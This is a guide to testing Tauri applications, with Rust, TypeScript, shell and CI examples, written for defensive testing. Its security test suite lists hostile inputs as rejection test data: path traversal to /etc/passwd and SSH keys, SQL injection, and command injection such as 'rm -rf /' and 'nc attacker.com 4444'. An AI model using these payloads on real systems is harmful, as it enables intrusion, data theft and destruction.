# Tauri Testing and Validation Guide

Comprehensive guide to testing Tauri applications, including unit tests, integration tests, security tests, and validation strategies.

---

## 1. Backend Testing (Rust)

### Unit Testing Commands

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validation_rejects_invalid_input() {
        let request = FileRequest {
            path: "../../../etc/passwd".to_string()
        };

        let result = request.validate();
        assert!(result.is_err(), "Should reject path traversal");

        let request = FileRequest {
            path: "valid/path.txt".to_string()
        };
        assert!(request.validate().is_ok(), "Should accept valid path");
    }

    #[test]
    fn test_path_traversal_blocked() {
        let dangerous_paths = vec![
            "../secret",
            "../../etc/passwd",
            "~/private",
            "/etc/shadow",
            "..\\windows\\system32",
        ];

        for path in dangerous_paths {
            let request = FileRequest { path: path.to_string() };
            assert!(
                request.validate().is_err(),
                "Should block path: {}",
                path
            );
        }
    }

    #[test]
    fn test_input_length_validation() {
        // Too short
        let request = SaveDataRequest {
            key: "".to_string(),
            value: "data".to_string(),
        };
        assert!(request.validate().is_err());

        // Too long
        let request = SaveDataRequest {
            key: "k".repeat(1000),
            value: "data".to_string(),
        };
        assert!(request.validate().is_err());

        // Just right
        let request = SaveDataRequest {
            key: "valid_key".to_string(),
            value: "valid_data".to_string(),
        };
        assert!(request.validate().is_ok());
    }
}
```

### Testing Async Commands

```rust
#[cfg(test)]
mod async_tests {
    use super::*;
    use tokio::test as tokio_test;

    #[tokio_test]
    async fn test_async_command_success() {
        let result = process_data("valid input".to_string()).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "Processed: valid input");
    }

    #[tokio_test]
    async fn test_async_command_error_handling() {
        let result = process_data("".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Invalid input"));
    }

    #[tokio_test]
    async fn test_file_operations() {
        let temp_dir = tempfile::tempdir().unwrap();
        let file_path = temp_dir.path().join("test.txt");

        // Write test
        let write_result = write_file(
            file_path.to_str().unwrap().to_string(),
            "test content".to_string()
        ).await;
        assert!(write_result.is_ok());

        // Read test
        let read_result = read_file(
            file_path.to_str().unwrap().to_string()
        ).await;
        assert!(read_result.is_ok());
        assert_eq!(read_result.unwrap(), "test content");
    }
}
```

### Mocking Dependencies

```rust
#[cfg(test)]
mod mock_tests {
    use super::*;
    use mockall::predicate::*;
    use mockall::mock;

    // Define mock trait
    mock! {
        Database {
            fn insert(&self, key: &str, value: &str) -> Result<(), DbError>;
            fn get(&self, key: &str) -> Result<String, DbError>;
        }
    }

    #[tokio_test]
    async fn test_with_mock_database() {
        let mut mock_db = MockDatabase::new();

        mock_db.expect_insert()
            .with(eq("test_key"), eq("test_value"))
            .times(1)
            .returning(|_, _| Ok(()));

        let result = save_to_database(&mock_db, "test_key", "test_value").await;
        assert!(result.is_ok());
    }
}
```

### Testing Error Handling

```rust
#[cfg(test)]
mod error_tests {
    use super::*;

    #[test]
    fn test_error_serialization_hides_details() {
        let internal_error = AppError::Internal(
            anyhow::anyhow!("Database connection failed at 192.168.1.1:5432")
        );

        let serialized = serde_json::to_string(&internal_error).unwrap();

        // Should NOT contain internal details
        assert!(!serialized.contains("192.168.1.1"));
        assert!(!serialized.contains("5432"));

        // Should contain generic message
        assert!(serialized.contains("internal error"));
    }

    #[test]
    fn test_error_types_are_distinguishable() {
        let validation_err = AppError::Validation(/* ... */);
        let permission_err = AppError::PermissionDenied;
        let not_found_err = AppError::NotFound;

        assert!(matches!(validation_err, AppError::Validation(_)));
        assert!(matches!(permission_err, AppError::PermissionDenied));
        assert!(matches!(not_found_err, AppError::NotFound));
    }
}
```

---

## 2. Frontend Testing (TypeScript/JavaScript)

### Testing IPC Commands with Vitest

```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { invoke } from '@tauri-apps/api/core'

// Mock the Tauri API
vi.mock('@tauri-apps/api/core')

describe('Tauri IPC Commands', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  it('should invoke read_file command successfully', async () => {
    const mockContent = 'file content'
    vi.mocked(invoke).mockResolvedValue(mockContent)

    const result = await invoke('read_file', {
      path: 'config.json'
    })

    expect(invoke).toHaveBeenCalledWith('read_file', {
      path: 'config.json'
    })
    expect(result).toBe(mockContent)
  })

  it('should handle command errors', async () => {
    const mockError = new Error('File not found')
    vi.mocked(invoke).mockRejectedValue(mockError)

    await expect(
      invoke('read_file', { path: 'nonexistent.txt' })
    ).rejects.toThrow('File not found')
  })

  it('should validate input before invoking command', async () => {
    const invalidPath = '../../../etc/passwd'

    // Should not call invoke if validation fails
    const isValid = validatePath(invalidPath)
    expect(isValid).toBe(false)

    if (!isValid) {
      // Don't call invoke
      expect(invoke).not.toHaveBeenCalled()
    }
  })
})
```

### Testing Window Management

```typescript
import { describe, it, expect, vi } from 'vitest'
import { WebviewWindow } from '@tauri-apps/api/webviewWindow'

vi.mock('@tauri-apps/api/webviewWindow')

describe('Window Manager', () => {
  it('should reuse existing windows', async () => {
    const mockWindow = {
      show: vi.fn().mockResolvedValue(undefined),
      setFocus: vi.fn().mockResolvedValue(undefined),
      label: 'dialog'
    }

    vi.mocked(WebviewWindow.getByLabel).mockReturnValue(mockWindow as any)

    const window = await WindowManager.show('dialog', {
      url: '/dialog',
      width: 400,
      height: 300
    })

    expect(WebviewWindow.getByLabel).toHaveBeenCalledWith('dialog')
    expect(mockWindow.show).toHaveBeenCalled()
    expect(mockWindow.setFocus).toHaveBeenCalled()
  })

  it('should create new window if not exists', async () => {
    vi.mocked(WebviewWindow.getByLabel).mockReturnValue(null)

    const MockWebviewWindow = vi.fn()
    vi.mocked(WebviewWindow).mockImplementation(MockWebviewWindow as any)

    await WindowManager.show('new-window', {
      url: '/new',
      width: 500,
      height: 400
    })

    expect(MockWebviewWindow).toHaveBeenCalledWith('new-window', {
      url: '/new',
      width: 500,
      height: 400
    })
  })
})
```

### Testing Event Handlers

```typescript
import { describe, it, expect, vi } from 'vitest'
import { listen } from '@tauri-apps/api/event'

vi.mock('@tauri-apps/api/event')

describe('Event Handlers', () => {
  it('should handle custom events', async () => {
    const mockUnlisten = vi.fn()
    const eventHandler = vi.fn()

    vi.mocked(listen).mockImplementation(async (event, handler) => {
      // Store handler for later invocation
      if (event === 'update-available') {
        handler({ payload: { version: '1.2.0' } } as any)
      }
      return mockUnlisten
    })

    await listen('update-available', eventHandler)

    expect(eventHandler).toHaveBeenCalledWith({
      payload: { version: '1.2.0' }
    })
  })

  it('should clean up event listeners', async () => {
    const mockUnlisten = vi.fn()
    vi.mocked(listen).mockResolvedValue(mockUnlisten)

    const unlisten = await listen('test-event', vi.fn())
    unlisten()

    expect(mockUnlisten).toHaveBeenCalled()
  })
})
```

---

## 3. Security Testing

### Security Test Suite

```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_path_traversal_attacks() {
        let attack_vectors = vec![
            "../secret.txt",
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "..%2F..%2Fetc%2Fpasswd",
            "~/sensitive_file",
            "/absolute/path/to/secret",
        ];

        for attack in attack_vectors {
            let request = FileRequest { path: attack.to_string() };
            assert!(
                request.validate().is_err(),
                "Should block attack: {}",
                attack
            );
        }
    }

    #[test]
    fn test_sql_injection_prevention() {
        let sql_attacks = vec![
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT password FROM users--",
        ];

        for attack in sql_attacks {
            let request = SaveDataRequest {
                key: attack.to_string(),
                value: "data".to_string(),
            };

            // Should be blocked by validation
            assert!(request.validate().is_err());
        }
    }

    #[test]
    fn test_command_injection_prevention() {
        let command_attacks = vec![
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 4444",
            "`whoami`",
            "$(curl attacker.com)",
        ];

        for attack in command_attacks {
            // Commands should be fixed, not accept user input
            // This tests that our API doesn't allow arbitrary commands
            let result = validate_command_input(attack);
            assert!(result.is_err(), "Should block: {}", attack);
        }
    }

    #[tokio_test]
    async fn test_unauthorized_origin_blocked() {
        let mock_window = create_mock_window_with_origin("https://evil.com");

        let result = sensitive_operation(mock_window).await;

        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Invalid origin"));
    }

    #[test]
    fn test_rate_limiting() {
        let mut rate_limiter = RateLimiter::new(5, Duration::from_secs(60));

        // First 5 requests should succeed
        for _ in 0..5 {
            assert!(rate_limiter.check("user1").is_ok());
        }

        // 6th request should be rate limited
        assert!(rate_limiter.check("user1").is_err());
    }

    #[test]
    fn test_input_size_limits() {
        // Test maximum sizes
        let huge_string = "A".repeat(100_000_000); // 100MB

        let request = SaveDataRequest {
            key: "test".to_string(),
            value: huge_string,
        };

        assert!(request.validate().is_err(), "Should reject huge inputs");
    }

    #[test]
    fn test_special_float_values() {
        let invalid_amounts = vec![
            f64::NAN,
            f64::INFINITY,
            f64::NEG_INFINITY,
            -1.0,  // Negative
            0.0,   // Zero
        ];

        for amount in invalid_amounts {
            let request = AmountRequest { amount };
            assert!(request.validate().is_err());
        }
    }
}
```

### Penetration Testing Checklist

```bash
#!/bin/bash
# security-tests.sh - Automated security checks

echo "=== Tauri Security Audit ==="

# Check for hardcoded secrets
echo "Checking for hardcoded secrets..."
rg -i "password|secret|api_key|token" src-tauri/src/ --type rust
if [ $? -eq 0 ]; then
    echo "⚠️  WARNING: Found potential hardcoded secrets"
fi

# Check CSP configuration
echo "Checking CSP configuration..."
if grep -q '"csp": null' src-tauri/tauri.conf.json; then
    echo "❌ CRITICAL: CSP is disabled!"
    exit 1
fi

# Check for unsafe CSP directives
if grep -q "'unsafe-eval'" src-tauri/tauri.conf.json; then
    echo "⚠️  WARNING: CSP allows unsafe-eval"
fi

# Check for overly permissive capabilities
echo "Checking capabilities..."
if grep -q '"fs:default"' src-tauri/capabilities/*.json; then
    echo "⚠️  WARNING: Using broad fs:default permission"
fi

if grep -q '"shell:allow-execute"' src-tauri/capabilities/*.json; then
    echo "⚠️  WARNING: Shell execution is enabled"
fi

# Check Rust dependencies for vulnerabilities
echo "Running cargo audit..."
cd src-tauri && cargo audit
if [ $? -ne 0 ]; then
    echo "❌ CRITICAL: Vulnerable dependencies found"
    exit 1
fi

# Check for proper input validation
echo "Checking for input validation..."
if ! grep -q "validator::Validate" src-tauri/src/*.rs; then
    echo "⚠️  WARNING: No validation found in source files"
fi

echo "✅ Security audit complete"
```

---

## 4. Integration Testing

### End-to-End Testing with WebDriver

```typescript
import { test, expect } from '@playwright/test'
import { _electron as electron } from 'playwright'

test.describe('Tauri E2E Tests', () => {
  let electronApp: any
  let window: any

  test.beforeAll(async () => {
    // Launch Tauri app
    electronApp = await electron.launch({
      args: ['./src-tauri/target/release/app']
    })
    window = await electronApp.firstWindow()
  })

  test.afterAll(async () => {
    await electronApp.close()
  })

  test('should load main window', async () => {
    expect(await window.title()).toBe('My Tauri App')
  })

  test('should handle IPC commands', async () => {
    // Trigger IPC command from frontend
    const result = await window.evaluate(async () => {
      const { invoke } = window.__TAURI__
      return await invoke('greet', { name: 'Test' })
    })

    expect(result).toContain('Hello, Test!')
  })

  test('should handle file operations securely', async () => {
    // Try path traversal attack
    const result = await window.evaluate(async () => {
      const { invoke } = window.__TAURI__
      try {
        await invoke('read_file', { path: '../../../etc/passwd' })
        return 'SECURITY_BREACH'
      } catch (error) {
        return 'BLOCKED'
      }
    })

    expect(result).toBe('BLOCKED')
  })
})
```

---

## 5. Performance Testing

### Load Testing IPC Commands

```rust
#[cfg(test)]
mod performance_tests {
    use super::*;
    use std::time::Instant;

    #[tokio_test]
    async fn test_command_performance() {
        let iterations = 1000;
        let start = Instant::now();

        for i in 0..iterations {
            let _ = fast_command(i.to_string()).await;
        }

        let duration = start.elapsed();
        let avg_ms = duration.as_millis() / iterations;

        assert!(
            avg_ms < 10,
            "Command too slow: {}ms average",
            avg_ms
        );
    }

    #[tokio_test]
    async fn test_concurrent_commands() {
        let tasks: Vec<_> = (0..100)
            .map(|i| tokio::spawn(async move {
                process_data(format!("task_{}", i)).await
            }))
            .collect();

        let start = Instant::now();
        for task in tasks {
            task.await.unwrap().unwrap();
        }
        let duration = start.elapsed();

        assert!(
            duration.as_secs() < 5,
            "Concurrent processing too slow: {:?}",
            duration
        );
    }
}
```

---

## 6. Continuous Integration Setup

### GitHub Actions Workflow

```yaml
name: Tauri CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    strategy:
      matrix:
        platform: [ubuntu-latest, macos-latest, windows-latest]

    runs-on: ${{ matrix.platform }}

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: 20

      - name: Setup Rust
        uses: actions-rs/toolchain@v1
        with:
          toolchain: stable

      - name: Install dependencies
        run: npm ci

      - name: Run Rust tests
        run: cd src-tauri && cargo test

      - name: Run Rust clippy
        run: cd src-tauri && cargo clippy -- -D warnings

      - name: Run cargo audit
        run: cd src-tauri && cargo audit

      - name: Run frontend tests
        run: npm test

      - name: Type check
        run: npm run typecheck

      - name: Security audit
        run: npm audit

      - name: Build Tauri app
        run: npm run tauri build
```

---

## 7. Test Coverage

### Measuring Coverage

```bash
# Rust coverage with tarpaulin
cargo install cargo-tarpaulin
cd src-tauri && cargo tarpaulin --out Html --output-dir ../coverage

# Frontend coverage with Vitest
npm test -- --coverage
```

### Coverage Requirements

- **Backend (Rust)**: Aim for >80% coverage on command handlers
- **Frontend**: Aim for >70% coverage on IPC integrations
- **Security tests**: 100% coverage on validation functions

---

## 8. Test Execution Commands

```bash
# Backend tests
cd src-tauri && cargo test
cd src-tauri && cargo test -- --nocapture  # With output
cd src-tauri && cargo test --release       # Optimized build

# Frontend tests
npm test                    # Run all tests
npm test -- --watch        # Watch mode
npm test -- --coverage     # With coverage
npm test -- --ui           # Visual UI

# Linting
cd src-tauri && cargo clippy -- -D warnings
npm run lint

# Security audits
cd src-tauri && cargo audit
npm audit

# Full verification
npm run test:all   # Run both backend and frontend tests
```

---

## 9. Pre-Deployment Testing Checklist

Before deploying a Tauri application:

### Security Tests
- [ ] All IPC commands have input validation tests
- [ ] Path traversal attacks blocked
- [ ] Origin verification tests passing
- [ ] No hardcoded secrets in code
- [ ] CSP configuration validated
- [ ] Cargo audit shows no vulnerabilities
- [ ] NPM audit shows no critical issues

### Functional Tests
- [ ] All unit tests passing
- [ ] Integration tests passing
- [ ] E2E tests on all target platforms
- [ ] Window lifecycle tests
- [ ] File operations tests
- [ ] Error handling tests

### Performance Tests
- [ ] Command response time < 100ms
- [ ] No memory leaks detected
- [ ] Resource cleanup verified
- [ ] Concurrent operation tests passing

### Code Quality
- [ ] Cargo clippy passes with no warnings
- [ ] ESLint passes with no warnings
- [ ] TypeScript type checks pass
- [ ] Test coverage meets thresholds
- [ ] All tests documented

---

## 10. Common Testing Pitfalls

**Pitfall**: Not testing error paths
**Solution**: Write tests for both success and failure cases

**Pitfall**: Mocking too much, not enough integration tests
**Solution**: Balance unit tests with integration tests

**Pitfall**: Not testing security boundaries
**Solution**: Dedicated security test suite for all IPC commands

**Pitfall**: Tests depending on specific timing
**Solution**: Use deterministic test patterns, avoid `sleep()`

**Pitfall**: Not cleaning up test resources
**Solution**: Use RAII patterns, tempfile crate, proper teardown
